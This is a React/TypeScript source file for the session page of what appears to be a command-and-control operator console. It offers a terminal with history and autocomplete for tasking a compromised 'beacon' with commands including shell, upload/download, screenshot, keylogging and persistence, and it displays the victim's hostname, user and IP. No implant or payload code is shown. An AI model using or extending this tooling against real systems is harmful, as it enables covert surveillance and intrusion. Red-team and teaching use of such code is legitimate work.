// ===========================
// © AngelaMos | 2026
// pages/session/index.tsx
//
// Interactive terminal session for issuing commands to a single beacon
//
// Renders a terminal-style interface for a specific beacon: command
// input with history navigation and Tab autocomplete, quick-action
// buttons for sysinfo/proclist/screenshot, and a scrolling output panel
// that updates as task results arrive. Screenshots render inline as
// images; all other output renders as preformatted text.
//
// Key components:
//   Component (Session) - lazy-loaded route component for /session/:id
//
// Connects to:
//   config.ts - reads ROUTES.DASHBOARD for the back link
//   core/types.ts - imports CommandType, TaskResult
//   core/ws.ts - calls useBeacon, useOperatorSocket, useTaskResults, useTaskIdMap
// ===========================

import { useCallback, useEffect, useRef, useState } from 'react'
import { LuArrowLeft, LuCamera, LuCircle, LuCpu, LuList } from 'react-icons/lu'
import { Link, useParams } from 'react-router-dom'
import { ROUTES } from '@/config'
import type { CommandType, TaskResult } from '@/core/types'
import {
  useBeacon,
  useOperatorSocket,
  useTaskIdMap,
  useTaskResults,
} from '@/core/ws'
import styles from './session.module.scss'

const COMMANDS: CommandType[] = [
  'shell',
  'sysinfo',
  'proclist',
  'upload',
  'download',
  'screenshot',
  'keylog_start',
  'keylog_stop',
  'persist',
  'sleep',
]

interface TerminalEntry {
  command: string
  args: string | undefined
  result: TaskResult | null
  taskId: string
}

function parseInput(raw: string): { command: CommandType; args?: string } | null {
  const trimmed = raw.trim()
  if (trimmed.length === 0) return null

  const spaceIdx = trimmed.indexOf(' ')
  const cmd = spaceIdx === -1 ? trimmed : trimmed.slice(0, spaceIdx)
  const args = spaceIdx === -1 ? undefined : trimmed.slice(spaceIdx + 1).trim()

  if (!COMMANDS.includes(cmd as CommandType)) return null
  return { command: cmd as CommandType, args: args || undefined }
}

function isOnline(lastSeen: string): boolean {
  return Date.now() - new Date(lastSeen).getTime() < 30_000
}

function QuickActions({
  onSend,
}: {
  onSend: (cmd: CommandType) => void
}): React.ReactElement {
  return (
    <div className={styles.quickActions}>
      <button
        type="button"
        onClick={() => onSend('sysinfo')}
        className={styles.quickBtn}
      >
        <LuCpu />
        sysinfo
      </button>
      <button
        type="button"
        onClick={() => onSend('proclist')}
        className={styles.quickBtn}
      >
        <LuList />
        proclist
      </button>
      <button
        type="button"
        onClick={() => onSend('screenshot')}
        className={styles.quickBtn}
      >
        <LuCamera />
        screenshot
      </button>
    </div>
  )
}

function TerminalOutput({
  entries,
}: {
  entries: TerminalEntry[]
}): React.ReactElement {
  const scrollRef = useRef<HTMLDivElement>(null)

  // biome-ignore lint/correctness/useExhaustiveDependencies: entries prop triggers scroll-to-bottom on new data
  useEffect(() => {
    scrollRef.current?.scrollTo({
      top: scrollRef.current.scrollHeight,
      behavior: 'smooth',
    })
  }, [entries])

  return (
    <div className={styles.terminal} ref={scrollRef}>
      {entries.length === 0 && (
        <p className={styles.terminalHint}>
          Type a command below or use the quick actions. Try: shell whoami
        </p>
      )}
      {entries.map((entry) => (
        <div key={entry.taskId} className={styles.entry}>
          <div className={styles.entryCmd}>
            {'> '}
            {entry.command}
            {entry.args ? ` ${entry.args}` : ''}
          </div>
          {entry.result === null ? (
            <div className={styles.entryPending}>awaiting response...</div>
          ) : entry.result.error ? (
            <div className={styles.entryError}>{entry.result.error}</div>
          ) : entry.command === 'screenshot' && entry.result.output ? (
            <img
              src={`data:image/png;base64,${entry.result.output}`}
              alt="Screenshot"
              className={styles.screenshot}
            />
          ) : (
            <pre className={styles.entryOutput}>{entry.result.output}</pre>
          )}
        </div>
      ))}
    </div>
  )
}

export function Component(): React.ReactElement {
  const { id } = useParams<{ id: string }>()
  const beacon = useBeacon(id ?? '')
  const { sendTask } = useOperatorSocket()
  const taskResults = useTaskResults()
  const taskIdMap = useTaskIdMap()
  const [input, setInput] = useState('')
  const [entries, setEntries] = useState<TerminalEntry[]>([])
  const [history, setHistory] = useState<string[]>([])
  const [historyIdx, setHistoryIdx] = useState(-1)
  const inputRef = useRef<HTMLInputElement>(null)
  const [suggestions, setSuggestions] = useState<CommandType[]>([])

  useEffect(() => {
    setEntries((prev) =>
      prev.map((entry) => {
        if (entry.result !== null) return entry
        const realId = taskIdMap[entry.taskId]
        if (!realId) return entry
        const match = taskResults.find((r) => r.task_id === realId)
        if (match) return { ...entry, result: match }
        return entry
      })
    )
  }, [taskResults, taskIdMap])

  const handleSend = useCallback(
    (command: CommandType, args?: string) => {
      if (!id) return
      const taskId = `local-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`
      setEntries((prev) => [...prev, { command, args, result: null, taskId }])
      sendTask(id, command, args, taskId)
    },
    [id, sendTask]
  )

  const handleSubmit = useCallback(() => {
    const parsed = parseInput(input)
    if (parsed === null) return

    handleSend(parsed.command, parsed.args)
    setHistory((prev) => [input, ...prev])
    setHistoryIdx(-1)
    setInput('')
    setSuggestions([])
  }, [input, handleSend])

  const handleKeyDown = useCallback(
    (e: React.KeyboardEvent<HTMLInputElement>) => {
      if (e.key === 'Enter') {
        handleSubmit()
        return
      }

      if (e.key === 'ArrowUp') {
        e.preventDefault()
        if (history.length === 0) return
        const next = Math.min(historyIdx + 1, history.length - 1)
        setHistoryIdx(next)
        setInput(history[next])
        return
      }

      if (e.key === 'ArrowDown') {
        e.preventDefault()
        if (historyIdx <= 0) {
          setHistoryIdx(-1)
          setInput('')
          return
        }
        const next = historyIdx - 1
        setHistoryIdx(next)
        setInput(history[next])
        return
      }

      if (e.key === 'Tab' && suggestions.length > 0) {
        e.preventDefault()
        setInput(suggestions[0])
        setSuggestions([])
      }
    },
    [handleSubmit, history, historyIdx, suggestions]
  )

  const handleInputChange = useCallback(
    (e: React.ChangeEvent<HTMLInputElement>) => {
      const val = e.target.value
      setInput(val)
      setHistoryIdx(-1)

      const cmd = val.split(' ')[0].toLowerCase()
      if (cmd.length > 0 && !val.includes(' ')) {
        setSuggestions(COMMANDS.filter((c) => c.startsWith(cmd) && c !== cmd))
      } else {
        setSuggestions([])
      }
    },
    []
  )

  if (!beacon) {
    return (
      <div className={styles.page}>
        <Link to={ROUTES.DASHBOARD} className={styles.backLink}>
          <LuArrowLeft />
          Back to Dashboard
        </Link>
        <p className={styles.notFound}>Beacon not found</p>
      </div>
    )
  }

  const online = beacon.active && isOnline(beacon.last_seen)

  return (
    <div className={styles.page}>
      <Link to={ROUTES.DASHBOARD} className={styles.backLink}>
        <LuArrowLeft />
        Back to Dashboard
      </Link>

      <div className={styles.header}>
        <div className={styles.headerInfo}>
          <h2 className={styles.title}>{beacon.hostname}</h2>
          <span className={styles.meta}>
            {beacon.username}@{beacon.internal_ip} | {beacon.os} | {beacon.arch}
          </span>
        </div>
        <span
          className={`${styles.statusDot} ${online ? styles.online : styles.offline}`}
          role="img"
          aria-label={online ? 'Online' : 'Offline'}
        >
          <LuCircle />
        </span>
      </div>

      <QuickActions onSend={handleSend} />

      <TerminalOutput entries={entries} />

      <div className={styles.inputArea}>
        {suggestions.length > 0 && (
          <div className={styles.suggestions}>
            {suggestions.map((s) => (
              <button
                key={s}
                type="button"
                className={styles.suggestion}
                onClick={() => {
                  setInput(s)
                  setSuggestions([])
                  inputRef.current?.focus()
                }}
              >
                {s}
              </button>
            ))}
          </div>
        )}
        <div className={styles.inputRow}>
          <span className={styles.prompt}>{'>'}</span>
          <input
            ref={inputRef}
            type="text"
            value={input}
            onChange={handleInputChange}
            onKeyDown={handleKeyDown}
            className={styles.input}
            placeholder="shell whoami"
            autoComplete="off"
            spellCheck={false}
          />
        </div>
      </div>
    </div>
  )
}

Component.displayName = 'Session'
